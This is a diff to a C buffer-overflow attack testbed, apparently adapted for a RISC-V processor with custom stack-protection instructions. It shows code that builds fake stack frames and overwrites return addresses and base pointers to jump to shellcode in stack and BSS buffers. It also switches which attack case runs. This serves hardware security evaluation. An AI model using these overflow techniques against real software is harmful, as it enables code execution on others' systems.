@@ -28,7 +28,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-//#include <setjmp.h>
+#include <setjmp.h>
 #include <string.h>
 
 #define BUFSIZE 16
@@ -126,9 +126,14 @@ void vuln_stack_return_addr(int choice) { /* Attack forms 1(a) and 3(a) */
     memset(overflow_buffer, 'A', overflow-4);
     overflow_buffer[overflow/4-1] = (long)&shellcode;
 
+    for(int j=0; j<overflow/4; j++) {
+      asm volatile ("p.spsw x0, 0(%[ovf]);"                
+                    :
+                    :[ovf] "r" (overflow_buffer+j));
+    }
+
     /* Then overflow stack_buffer with overflow_buffer */
     memcpy(stack_buffer, overflow_buffer, overflow); 
-
   }
   else if ((choice == 7) &&
 	   ((long)&stack_pointer > (long)&propolice_dummy)) {
@@ -156,20 +161,23 @@ void vuln_stack_base_ptr(int choice) { /* Attack forms 1(b) and 3(b) */
   long *stack_pointer;
   long stack_buffer[BUFSIZE];
   char propolice_dummy[10];
-  int overflow, i;
+  int overflow;
 
   /* Just a dummy pointer setup */
   stack_pointer = &stack_buffer[1];
 
+  /* Store in i the address of the stack frame section dedicated to function arguments */
+  register int i asm("x8"); 
+
   if ((choice == 2) &&
-      ((long)&choice > (long)&propolice_dummy)) {
+      ((long)i > (long)&propolice_dummy)) {
     /* First set up overflow_buffer with a fake stack frame
        consisting of a base pointer and a return address
        pointing to the shellcode, a few 'A's and a new 
        base pointer pointing back at the fake stack frame */
-    overflow = (int)((long)&choice - (long)&stack_buffer)-base_pointer_offset;
+    overflow = (int)((long)i - (long)&stack_buffer)-base_pointer_offset;
     /* Copy base pointer */
-    overflow_buffer[0] = (long)(&choice-1-(base_pointer_offset/4));
+    overflow_buffer[0] = (long)(i-4-(base_pointer_offset/4)*4);
     /* Fake return address */
     overflow_buffer[1] = (long)&shellcode;
     memset(overflow_buffer+2, 'A', overflow-4);
@@ -297,6 +305,9 @@ void vuln_bss_base_ptr(int choice) { /* Attack form 4(b)*/
   char propolice_dummy_1[10];
   int overflow;
 
+  /* Store in i the address of the stack frame section dedicated to function arguments */
+  register int i asm("x8"); 
+
   if ((choice == 12) &&
 	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
     /* First set up overflow_buffer with a fake stack frame
@@ -306,12 +317,12 @@ void vuln_bss_base_ptr(int choice) { /* Attack form 4(b)*/
     overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
     overflow_buffer[0] = (long)&bss_buffer[1];
     /* Copy base pointer */
-    overflow_buffer[1] = (long)(&choice-1-(base_pointer_offset/4));
+    overflow_buffer[1] = (long)(i-4-(base_pointer_offset/4)*4);
     /* Fake return address */
     overflow_buffer[2] = (long)&shellcode;
     memset(overflow_buffer+3, 'A', overflow-4*(3+1));
     /* Old base pointer */
-    overflow_buffer[overflow/4-1] = (long)(&choice-1-(base_pointer_offset/4));
+    overflow_buffer[overflow/4-1] = (long)(i-4-(base_pointer_offset/4)*4);
 
     /* Then overflow bss_buffer with overflow_buffer  */
     /* Now bss_pointer points to the old base pointer */
@@ -382,7 +393,7 @@ int main (int argc, char **argv) {
   
   base_pointer_offset = 4;
 
-  choice = -2;
+  choice = 1;
 
   switch(choice) {
   case -4:
@@ -399,7 +410,7 @@ int main (int argc, char **argv) {
     break;
   case 2:
     vuln_stack_base_ptr(choice);
-    printf("Attack prevented.\n");
+    //printf("Attack prevented.\n");
     break;
   case 3:
     vuln_stack_function_ptr(choice);
@@ -415,7 +426,7 @@ int main (int argc, char **argv) {
     break;
   case 8:
     vuln_stack_base_ptr(choice);
-    printf("Attack prevented.\n");
+    //printf("Attack prevented.\n");
     break;
   case 9:
     vuln_stack_function_ptr(choice);
@@ -427,7 +438,7 @@ int main (int argc, char **argv) {
     break;
   case 12:
     vuln_bss_base_ptr(choice);
-    printf("Attack prevented.\n");
+    //printf("Attack prevented.\n");
     break;
   case 13:
     vuln_bss_function_ptr(choice);
